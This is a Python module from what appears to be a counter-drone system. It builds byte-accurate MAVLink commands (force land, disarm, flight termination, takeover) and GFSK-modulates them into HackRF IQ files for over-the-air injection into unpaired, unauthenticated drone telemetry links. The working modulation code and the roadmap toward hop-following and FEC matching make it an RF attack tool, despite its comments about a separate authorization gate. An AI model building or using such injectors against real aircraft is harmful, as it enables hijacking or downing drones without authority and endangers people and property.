#!/usr/bin/env python3
"""SDR MAVLink frame injector — GFSK PHY modulation of a byte-accurate MAVLink
command frame into baseband IQ, for over-the-air injection into an
UNAUTHENTICATED, FIXED-FREQUENCY MAVLink telemetry link (no pairing).

=============================================================================
WHAT THIS IS (and, just as importantly, WHAT IT IS NOT)
=============================================================================
The existing takeover path (field-bridge/mavlink_takeover.py + the SiK bridge)
only reaches a drone we are ALREADY PAIRED WITH on a SiK radio we control — a
bench-only capability. This module is the ADVERSARY-GRADE alternative: it takes
a MAVLink frame built byte-accurately by backend/mavlink_codec.py
(force_land / RTH / disarm / etc.) and MODULATES it onto a baseband IQ stream
matching the PHYSICAL LAYER of a 3DR/SiK/RFD900-style telemetry link — GFSK at
a configurable air-data-rate, deviation and center frequency — producing an
interleaved-int8 IQ file that the existing device-pinned TX path
(hackrf_jam.transmit_iq_file -> `hackrf_transfer -t <iq> -d <930c TX serial>`)
can transmit. No SiK pairing, no shared NetID: it writes MAVLink bytes straight
onto the air the way any transmitter on that frequency would.

This module builds ONLY the PHY (modulation) layer. It reuses
backend/mavlink_codec.py verbatim for the frame BYTES — it never re-implements
CRC/framing. Nothing here transmits, opens a socket, or touches the backend;
it writes a file. It is import-safe and non-transmitting when merely imported.

-----------------------------------------------------------------------------
HONEST FIDELITY / SCOPE (project rule: do NOT overclaim capability)
-----------------------------------------------------------------------------
v1 targets a FIXED-FREQUENCY, UNENCRYPTED MAVLink telemetry link. Concretely:

  WORKS (is the real mechanism) against:
    * A legacy/unencrypted MAVLink-over-RF telemetry link parked on ONE known
      frequency (e.g. a 3DR/SiK/RFD900 radio in a fixed-channel / hop-disabled
      config, or any transparent GFSK serial link carrying raw MAVLink). If a
      receiver on that frequency will act on an unauthenticated COMMAND_LONG,
      these injected frames are indistinguishable from the real ground station.

  DOES NOT WORK (v1) against:
    * FHSS links. SiK/RFD900 DEFAULT configs frequency-hop across the ISM band
      on a pseudo-random sequence DERIVED FROM THE NETID. To inject into a
      hopping link you must FIRST capture/derive the hop pattern (NetID -> hop
      table) and retune per hop in lock-step with the target — NOT implemented
      here. This is the HARD next step (see "REMAINING", bottom of file). A
      fixed-freq burst against a hopping link lands on the target channel only
      ~1/N_channels of the time and will not reliably drive a takeover.
    * Encrypted / proprietary control links (DJI OcuSync/Lightbridge, ELRS/CRSF,
      Spektrum DSMX, FrSky ACCST/ACCESS, FlySky AFHDS, Graupner HoTT, TBS
      Crossfire). MAVLink injection DOES NOT APPLY at all — there is no
      unauthenticated MAVLink to inject into. Against those links the defeat
      mechanism is JAMMING (field-bridge/hackrf_jam.py), not injection. This is
      the same encrypted-link boundary mavlink_codec.classify_override_link()
      already enforces for the RC-override path.

  MODEL FIDELITY of the PHY itself (read before trusting against real hardware):
    * The GFSK modulator here (Gaussian-shaped 2-FSK, configurable BT / air-rate
      / deviation) is the correct modulation FAMILY for these radios and is
      byte-accurate on the MAVLink payload. What it does NOT reproduce is the
      exact vendor packet handler: SiK/Si10xx wraps the payload in its own
      preamble, sync word, Golay/FEC coding and interleaving. This module ships
      a GENERIC, PARAMETERIZED framer (configurable preamble + sync word, NO FEC)
      that matches a "transparent GFSK serial carrying raw MAVLink, FEC/MAVLink-
      framing off" target. Matching a specific SiK build's on-air framing
      (Golay FEC, exact sync/whitening, on-air bit order) is a per-target
      calibration step that must be verified against a real capture — see
      "REMAINING". So: this is an HONEST PHY model of the modulation, NOT a
      drop-in clone of any one radio's full link layer.

  => Correct one-line claim: "injects MAVLink command frames over the air into
     a fixed-frequency unencrypted MAVLink link, no pairing required." NOT
     "takes over any drone."

-----------------------------------------------------------------------------
GOVERNANCE (documented here; the gate is NOT implemented in this module)
-----------------------------------------------------------------------------
This module is TX PLUMBING ONLY and adds NO authorization bypass. When it is
later wired to a backend endpoint (a separate, orchestrated step), the emitted
IQ MUST be transmitted through the SAME arming spine as every other TX in this
system — require_commander + arm token + IFF interlock + range-auth lease +
tx_halt honoring + device-pin to the 930c TX serial (HACKRF_TX_SERIAL) — via
hackrf_jam.transmit_iq_file(). Producing an IQ file here confers no authority to
send it; generation and transmission are deliberately separate, exactly as the
GNSS-spoof path (gnss_signal_synth.py -> gnss_spoof_bridge.py) separates them.

Reference technique (studied, reimplemented cleanly — NOT copied): standard
Gaussian-FSK modulation (as in GMSK/GFSK radios and gnuradio's gmsk block) and
the public MAVLink wire format. No third-party code is vendored.
"""
from __future__ import annotations

import argparse
import math
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional

import numpy as np

# Reuse the byte-accurate MAVLink frame builders from the backend codec — the
# SINGLE source of truth for frame bytes/CRC — via the same sys.path pattern
# field-bridge/mavlink_takeover.py uses. We build the PHY here, never the bytes.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "backend"))
from mavlink_codec import (  # noqa: E402
    payload_force_land,
    payload_rth,
    payload_disarm,
    payload_flight_termination,
    payload_maneuver_takeover,
    describe_packet,
)

# =============================================================================
# Defaults. The sample rate default is LOAD-BEARING and matches the field TX
# path: hackrf_jam.transmit_iq_file() invokes `hackrf_transfer -s
# <hackrf_jam.SAMPLE_RATE_HZ>` with SAMPLE_RATE_HZ hard-set to 20_000_000. If
# the IQ here were generated at a different rate than hackrf_transfer plays it
# back at, every symbol period and the deviation would be time-scaled by the
# ratio -> the GFSK would be off-rate and undecodable. Keep this in sync with
# hackrf_jam.SAMPLE_RATE_HZ (that constant lives in a DIFFERENT workstream's
# file; a mismatch is flagged, not silently patched, from here).
# =============================================================================
DEFAULT_SAMPLE_RATE_HZ = 20_000_000

# Default center frequency: the 915 MHz ISM band SiK/3DR/RFD900 telemetry uses
# (US/AU band). EU units use 433 MHz — pass --freq-mhz explicitly for those.
DEFAULT_CENTER_FREQ_MHZ = 915.0

# Default air data rate (symbol rate, bits/s). RFD900's common default air
# speed is ~250 kbps; SiK "AIR_SPEED" defaults are lower (e.g. 64). This is a
# free operator parameter — set it to the TARGET link's actual air rate.
DEFAULT_AIR_DATA_RATE_BPS = 250_000.0

# Default peak frequency deviation (Hz). Modulation index h = 2*deviation/Rb;
# with the defaults above h = 2*62500/250000 = 0.5, a typical GFSK index. Set
# this to match the target radio's configured deviation.
DEFAULT_DEVIATION_HZ = 62_500.0

# Default Gaussian pulse-shaping bandwidth-time product. 0.5 is the common GFSK
# value (0.3 is GSM/GMSK). Lower BT = tighter spectrum, more ISI.
DEFAULT_BT = 0.5

# Generic GFSK framing. NOT a guaranteed match to a specific SiK build's packet
# handler (see fidelity note) — these are sane, configurable defaults:
#   * preamble: alternating 1010... (0xAA) bytes for receiver clock/bit sync.
#   * sync word: a short marker delimiting preamble from payload. 0x2D 0xD4 is
#     a widely used Si4432/Si10xx default sync value.
DEFAULT_PREAMBLE = b"\xAA\xAA\xAA\xAA"
DEFAULT_SYNC_WORD = b"\x2D\xD4"

# On-air bit order within each byte. Packet radios (Si4432/CC1101 class) shift
# MSB-first by default; a transparent-UART view is LSB-first. This is radio-
# config dependent and MUST be verified against a real target capture — exposed
# as a parameter for exactly that reason. Default 'msb' (common radio default).
DEFAULT_BIT_ORDER = "msb"

# Peak IQ amplitude (int8). Matches hackrf_jam.build_noise_iq()'s ~100 posture,
# leaving headroom under the +/-127 int8 clip. A constant-envelope GFSK signal
# sits at this magnitude the whole burst.
DEFAULT_AMPLITUDE = 100

# Gaussian pulse-shaping filter span in symbols (each side ~span/2). 4 is ample
# for BT >= 0.3; the Gaussian is truncated and re-normalized to unity DC gain so
# a sustained same-symbol run reaches full +/- deviation.
_GAUSS_SPAN_SYMBOLS = 4


# =============================================================================
# Named MAVLink command frames this injector can build (delegating BYTES to
# backend/mavlink_codec.py). Each returns a byte-accurate MAVLink v2 frame.
# =============================================================================
COMMAND_BUILDERS = {
    "force_land": payload_force_land,
    "rth": payload_rth,
    "disarm": payload_disarm,
    "flight_termination": payload_flight_termination,
    "maneuver_takeover": payload_maneuver_takeover,
}


def build_command_frame(command: str, target_system: int, target_component: int = 1,
                        seq: int = 0) -> bytes:
    """Return the byte-accurate MAVLink frame for a named command, built by the
    backend codec (NOT re-implemented here). `command` is a key of
    COMMAND_BUILDERS. Raises ValueError for an unknown command."""
    builder = COMMAND_BUILDERS.get(command)
    if builder is None:
        raise ValueError(
            f"unknown command {command!r}; valid: {sorted(COMMAND_BUILDERS)}"
        )
    return builder(target_system, target_component, seq)


# =============================================================================
# Byte <-> bit helpers.
# =============================================================================
def _validate_bit_order(bit_order: str) -> str:
    bo = str(bit_order).lower()
    if bo not in ("msb", "lsb"):
        raise ValueError(f"bit_order must be 'msb' or 'lsb', got {bit_order!r}")
    return bo


def bytes_to_bits(data: bytes, bit_order: str = DEFAULT_BIT_ORDER) -> np.ndarray:
    """Expand bytes to a flat int8 array of {0,1} bits, MSB- or LSB-first per
    byte. LSB-first is the UART/transparent-serial view; MSB-first is the common
    packet-radio on-air view. See DEFAULT_BIT_ORDER."""
    bo = _validate_bit_order(bit_order)
    if not data:
        return np.empty(0, dtype=np.int8)
    arr = np.frombuffer(data, dtype=np.uint8)
    bits = np.unpackbits(arr, bitorder="big" if bo == "msb" else "little")
    return bits.astype(np.int8)


def bits_to_bytes(bits, bit_order: str = DEFAULT_BIT_ORDER) -> bytes:
    """Inverse of bytes_to_bits(): pack a {0,1} bit sequence (length a multiple
    of 8) back into bytes. Used by the round-trip demod/deframe path."""
    bo = _validate_bit_order(bit_order)
    b = np.asarray(bits, dtype=np.uint8) & 1
    if b.size % 8 != 0:
        raise ValueError("bit count must be a multiple of 8 to pack to bytes")
    packed = np.packbits(b, bitorder="big" if bo == "msb" else "little")
    return packed.tobytes()


def build_framed_bits(frame: bytes, preamble: bytes = DEFAULT_PREAMBLE,
                      sync_word: bytes = DEFAULT_SYNC_WORD,
                      bit_order: str = DEFAULT_BIT_ORDER) -> np.ndarray:
    """[preamble | sync word | MAVLink frame] as one {0,1} bit array — the PHY
    payload that gets GFSK-modulated. The MAVLink bytes are inserted verbatim."""
    return np.concatenate([
        bytes_to_bits(preamble, bit_order),
        bytes_to_bits(sync_word, bit_order),
        bytes_to_bits(frame, bit_order),
    ]).astype(np.int8)


# =============================================================================
# GFSK modulation.
# =============================================================================
def gaussian_taps(sps_int: int, bt: float, span_symbols: int = _GAUSS_SPAN_SYMBOLS) -> np.ndarray:
    """Gaussian pulse-shaping filter taps, normalized to unity DC gain (sum=1).

    A run of identical symbols therefore drives the shaped waveform to full
    +/-1, so the instantaneous frequency reaches exactly +/- deviation_hz. The
    3 dB bandwidth is B = bt * symbol_rate; sigma (in symbol units) =
    sqrt(ln2)/(2*pi*bt)."""
    if bt <= 0:
        raise ValueError("bt must be > 0")
    sps_int = max(1, int(sps_int))
    ntaps = span_symbols * sps_int
    if ntaps % 2 == 0:
        ntaps += 1  # odd length -> a true center tap
    # t in symbol units, centered.
    t = (np.arange(ntaps) - (ntaps - 1) / 2.0) / float(sps_int)
    sigma = math.sqrt(math.log(2.0)) / (2.0 * math.pi * bt)
    h = np.exp(-(t * t) / (2.0 * sigma * sigma))
    h /= h.sum()
    return h.astype(np.float64)


def _upsample_nrz(symbols: np.ndarray, sample_rate: float, air_data_rate: float) -> np.ndarray:
    """Rectangular-hold upsample bipolar symbols (+/-1) to the sample rate,
    using CUMULATIVE symbol boundaries so a fractional samples-per-symbol never
    accumulates drift across a long frame (symbol k spans samples
    [round(k*sps), round((k+1)*sps))). Returns a float64 NRZ waveform."""
    n_sym = symbols.size
    if n_sym == 0:
        return np.empty(0, dtype=np.float64)
    sps = float(sample_rate) / float(air_data_rate)
    if sps <= 0:
        raise ValueError("sample_rate/air_data_rate must be > 0")
    edges = np.rint(np.arange(n_sym + 1) * sps).astype(np.int64)
    counts = np.diff(edges)
    return np.repeat(symbols.astype(np.float64), counts)


def modulate_bits_to_complex(
    bits: np.ndarray,
    sample_rate_hz: float = DEFAULT_SAMPLE_RATE_HZ,
    air_data_rate_bps: float = DEFAULT_AIR_DATA_RATE_BPS,
    deviation_hz: float = DEFAULT_DEVIATION_HZ,
    bt: float = DEFAULT_BT,
) -> np.ndarray:
    """GFSK-modulate a {0,1} bit sequence to a unit-amplitude complex baseband
    signal (complex128).

    bit 1 -> +1 symbol -> +deviation_hz; bit 0 -> -1 -> -deviation_hz. The NRZ
    symbol train is Gaussian pulse-shaped (BT), then frequency-modulated:
        f[n]     = deviation_hz * shaped_nrz[n]        (instantaneous frequency)
        phase[n] = 2*pi * cumsum(f) / sample_rate      (continuous phase)
        s[n]     = exp(j * phase[n])                   (constant envelope)
    """
    if bits.size == 0:
        return np.empty(0, dtype=np.complex128)
    if air_data_rate_bps <= 0:
        raise ValueError("air_data_rate_bps must be > 0")
    if air_data_rate_bps > sample_rate_hz:
        raise ValueError("air_data_rate_bps must be <= sample_rate_hz "
                         "(need >= 1 sample per symbol)")
    symbols = (2 * (np.asarray(bits, dtype=np.int64) & 1) - 1).astype(np.float64)  # 0->-1, 1->+1
    nrz = _upsample_nrz(symbols, sample_rate_hz, air_data_rate_bps)
    sps_int = max(1, int(round(sample_rate_hz / air_data_rate_bps)))
    taps = gaussian_taps(sps_int, bt)
    shaped = np.convolve(nrz, taps, mode="same")
    inst_freq = deviation_hz * shaped                      # Hz per sample
    phase = 2.0 * math.pi * np.cumsum(inst_freq) / float(sample_rate_hz)
    return np.exp(1j * phase)


def complex_to_interleaved_int8(iq_complex: np.ndarray, amplitude: int = DEFAULT_AMPLITUDE) -> np.ndarray:
    """Pack a complex baseband signal into HackRF's native interleaved-int8 IQ
    (I,Q,I,Q,...), byte-for-byte the layout hackrf_jam.build_noise_iq() and
    gnss_signal_synth produce, so hackrf_jam.transmit_iq_file() consumes it
    unchanged."""
    n = iq_complex.size
    out = np.empty(2 * n, dtype=np.int8)
    if n == 0:
        return out
    out[0::2] = np.clip(np.rint(iq_complex.real * amplitude), -127, 127).astype(np.int8)
    out[1::2] = np.clip(np.rint(iq_complex.imag * amplitude), -127, 127).astype(np.int8)
    return out


def modulate_frame_to_iq(
    frame: bytes,
    *,
    sample_rate_hz: float = DEFAULT_SAMPLE_RATE_HZ,
    air_data_rate_bps: float = DEFAULT_AIR_DATA_RATE_BPS,
    deviation_hz: float = DEFAULT_DEVIATION_HZ,
    bt: float = DEFAULT_BT,
    preamble: bytes = DEFAULT_PREAMBLE,
    sync_word: bytes = DEFAULT_SYNC_WORD,
    bit_order: str = DEFAULT_BIT_ORDER,
    amplitude: int = DEFAULT_AMPLITUDE,
    repeat: int = 1,
    gap_symbols: int = 0,
) -> np.ndarray:
    """Modulate ONE MAVLink frame into an interleaved-int8 IQ array ready for
    hackrf_jam.transmit_iq_file().

    The frame is wrapped [preamble | sync | frame] and GFSK-modulated. `repeat`
    re-emits the whole framed burst back-to-back (an unauthenticated command is
    typically sent several times to survive collisions on the target link);
    `gap_symbols` inserts that many idle (-1 / 0-bit) symbol periods between
    repeats. Fully deterministic — same inputs give byte-identical output."""
    if repeat < 1:
        raise ValueError("repeat must be >= 1")
    if gap_symbols < 0:
        raise ValueError("gap_symbols must be >= 0")

    framed = build_framed_bits(frame, preamble, sync_word, bit_order)
    if repeat == 1:
        all_bits = framed
    else:
        gap = np.zeros(gap_symbols, dtype=np.int8)  # 0-bits => -1 symbols (idle)
        parts: List[np.ndarray] = []
        for i in range(repeat):
            if i > 0 and gap_symbols > 0:
                parts.append(gap)
            parts.append(framed)
        all_bits = np.concatenate(parts).astype(np.int8)

    iq_complex = modulate_bits_to_complex(
        all_bits, sample_rate_hz, air_data_rate_bps, deviation_hz, bt
    )
    return complex_to_interleaved_int8(iq_complex, amplitude)


def write_iq_file(
    frame: bytes,
    path: Optional[str] = None,
    **kwargs,
) -> str:
    """Modulate `frame` and write the interleaved-int8 IQ to `path` (a temp file
    if omitted); return the path. Accepts the same keyword parameters as
    modulate_frame_to_iq(). Writes a file ONLY — never transmits."""
    import tempfile
    iq = modulate_frame_to_iq(frame, **kwargs)
    if path is None:
        f = tempfile.NamedTemporaryFile(suffix=".iq", delete=False)
        try:
            f.write(iq.tobytes())
        finally:
            f.close()
        return f.name
    with open(path, "wb") as fh:
        fh.write(iq.tobytes())
    return path


def describe_modulation(
    frame: bytes,
    *,
    sample_rate_hz: float = DEFAULT_SAMPLE_RATE_HZ,
    air_data_rate_bps: float = DEFAULT_AIR_DATA_RATE_BPS,
    deviation_hz: float = DEFAULT_DEVIATION_HZ,
    bt: float = DEFAULT_BT,
    preamble: bytes = DEFAULT_PREAMBLE,
    sync_word: bytes = DEFAULT_SYNC_WORD,
    bit_order: str = DEFAULT_BIT_ORDER,
    center_freq_mhz: float = DEFAULT_CENTER_FREQ_MHZ,
    repeat: int = 1,
    gap_symbols: int = 0,
) -> Dict:
    """Honest, transmit-free summary of what a burst WOULD look like: mod index,
    samples/symbol, sample count, on-air duration, etc. For logging / operator
    display — computes metadata only, generates no IQ and sends nothing."""
    framed_bits = build_framed_bits(frame, preamble, sync_word, bit_order).size
    total_bits = framed_bits * repeat + gap_symbols * max(0, repeat - 1)
    sps = float(sample_rate_hz) / float(air_data_rate_bps)
    n_samples = int(np.rint(total_bits * sps))
    return {
        "center_freq_mhz": center_freq_mhz,
        "sample_rate_hz": int(sample_rate_hz),
        "air_data_rate_bps": float(air_data_rate_bps),
        "deviation_hz": float(deviation_hz),
        "modulation_index": float(2.0 * deviation_hz / air_data_rate_bps),
        "bt": float(bt),
        "bit_order": _validate_bit_order(bit_order),
        "samples_per_symbol": sps,
        "frame_bytes": len(frame),
        "framed_bits_per_burst": int(framed_bits),
        "repeat": int(repeat),
        "gap_symbols": int(gap_symbols),
        "total_symbols": int(total_bits),
        "iq_samples": n_samples,
        "iq_int8_bytes": 2 * n_samples,
        "on_air_duration_s": float(total_bits / air_data_rate_bps),
        "mavlink": describe_packet(frame),
    }


# =============================================================================
# Reference GFSK DEMODULATOR — validation aid, NOT part of the attack path.
#
# A clean, noiseless soft-demod so the modulate->demodulate round-trip can be
# unit-tested (and so a captured burst can later be checked against the intended
# frame during real-receiver validation). It assumes the modulator's own timing
# (known samples/symbol, frame starts at sample 0) — it is NOT a full receiver
# with carrier/timing recovery. Nothing here transmits.
# =============================================================================
def demodulate_to_symbols(
    iq_int8: np.ndarray,
    sample_rate_hz: float = DEFAULT_SAMPLE_RATE_HZ,
    air_data_rate_bps: float = DEFAULT_AIR_DATA_RATE_BPS,
) -> np.ndarray:
    """Hard-decide the transmitted bit sequence from an interleaved-int8 IQ
    array by measuring instantaneous frequency (differential phase) at each
    symbol center. Returns a {0,1} int8 array (1 = +deviation symbol)."""
    i = iq_int8[0::2].astype(np.float64)
    q = iq_int8[1::2].astype(np.float64)
    z = i + 1j * q
    if z.size < 2:
        return np.empty(0, dtype=np.int8)
    inst = np.angle(z[1:] * np.conj(z[:-1]))  # rad/sample ~ instantaneous freq
    sps = float(sample_rate_hz) / float(air_data_rate_bps)
    n_sym = int(math.floor(z.size / sps))
    bits = np.empty(n_sym, dtype=np.int8)
    for k in range(n_sym):
        c = int(round((k + 0.5) * sps))
        c = min(max(c - 1, 0), inst.size - 1)  # inst is one shorter than z
        bits[k] = 1 if inst[c] > 0.0 else 0
    return bits


def deframe_symbols(
    bits: np.ndarray,
    n_frame_bytes: int,
    sync_word: bytes = DEFAULT_SYNC_WORD,
    bit_order: str = DEFAULT_BIT_ORDER,
) -> Optional[bytes]:
    """Locate the sync word in a demodulated bit stream and return the
    n_frame_bytes that follow it as bytes, or None if sync is not found. The
    inverse of build_framed_bits()'s framing (used by the round-trip test)."""
    sync_bits = bytes_to_bits(sync_word, bit_order)
    b = np.asarray(bits, dtype=np.int8) & 1
    need = sync_bits.size + n_frame_bytes * 8
    if b.size < need or sync_bits.size == 0:
        return None
    last_start = b.size - need
    for start in range(0, last_start + 1):
        if np.array_equal(b[start:start + sync_bits.size], sync_bits):
            payload_start = start + sync_bits.size
            payload = b[payload_start:payload_start + n_frame_bytes * 8]
            return bits_to_bytes(payload, bit_order)
    return None


# =============================================================================
# CLI: build a MAVLink frame + write its GFSK IQ to a file. NEVER transmits —
# transmission is a separate, governed step (see GOVERNANCE note at top). Mirror
# of the gnss_signal_synth generate-a-file-only posture.
# =============================================================================
def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    ap.add_argument("--command", choices=sorted(COMMAND_BUILDERS), default="force_land",
                    help="MAVLink command to build (bytes come from mavlink_codec).")
    ap.add_argument("--target-system", type=int, default=1)
    ap.add_argument("--target-component", type=int, default=1)
    ap.add_argument("--seq", type=int, default=0)
    ap.add_argument("--freq-mhz", type=float, default=DEFAULT_CENTER_FREQ_MHZ,
                    help="Target link center frequency (metadata/report only; "
                         "the actual retune happens at hackrf_transfer time).")
    ap.add_argument("--sample-rate-hz", type=int, default=DEFAULT_SAMPLE_RATE_HZ)
    ap.add_argument("--air-rate-bps", type=float, default=DEFAULT_AIR_DATA_RATE_BPS)
    ap.add_argument("--deviation-hz", type=float, default=DEFAULT_DEVIATION_HZ)
    ap.add_argument("--bt", type=float, default=DEFAULT_BT)
    ap.add_argument("--bit-order", choices=("msb", "lsb"), default=DEFAULT_BIT_ORDER)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--gap-symbols", type=int, default=0)
    ap.add_argument("--out", type=str, default=None,
                    help="IQ output path (interleaved int8). Default: a temp file.")
    args = ap.parse_args(argv)

    frame = build_command_frame(args.command, args.target_system,
                                args.target_component, args.seq)
    info = describe_modulation(
        frame,
        sample_rate_hz=args.sample_rate_hz,
        air_data_rate_bps=args.air_rate_bps,
        deviation_hz=args.deviation_hz,
        bt=args.bt,
        bit_order=args.bit_order,
        center_freq_mhz=args.freq_mhz,
        repeat=args.repeat,
        gap_symbols=args.gap_symbols,
    )
    path = write_iq_file(
        frame, args.out,
        sample_rate_hz=args.sample_rate_hz,
        air_data_rate_bps=args.air_rate_bps,
        deviation_hz=args.deviation_hz,
        bt=args.bt,
        bit_order=args.bit_order,
        repeat=args.repeat,
        gap_symbols=args.gap_symbols,
    )
    print("Built MAVLink frame + GFSK IQ (NOT transmitted).")
    for k, v in info.items():
        print(f"  {k}: {v}")
    print(f"  iq_file: {path}")
    print("NOTE: transmission is a separate governed step — this file must be "
          "sent only via the arm/IFF/range-auth/tx_halt/device-pin spine "
          "(hackrf_jam.transmit_iq_file -d <930c TX serial>).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())


# =============================================================================
# REMAINING FOR A REAL-LINK / REAL-RECEIVER TEST (later governed, authorized-
# range step — NOT done here; code + tests only):
#   1. Exact target framing: capture the real link with the RX HackRF, confirm
#      the vendor packet handler (preamble length, sync word, Golay/FEC,
#      whitening, on-air bit order) and either disable FEC on a transparent-
#      serial target or ADD the matching FEC/whitening layer here.
#   2. PHY calibration: match air_data_rate_bps / deviation_hz / bt to the
#      captured signal (measure from the capture), verify the modulated burst
#      correlates against the real ground station's frames.
#   3. FHSS: derive the NetID -> hop-sequence, then retune per hop in lock-step
#      (needs a hop-following TX loop — a substantial addition, not v1).
#   4. Receiver acceptance: on an authorized range, confirm a real autopilot
#      acts on the injected COMMAND_LONG, under the existing arm/confirm/
#      range-auth/tx_halt spine and device-pinned to the 930c TX unit.
#   5. Backend wiring: expose behind an endpoint that mints a TX-confirm token
#      only after the full governance gate, exactly like jam/gnss-spoof.
# =============================================================================
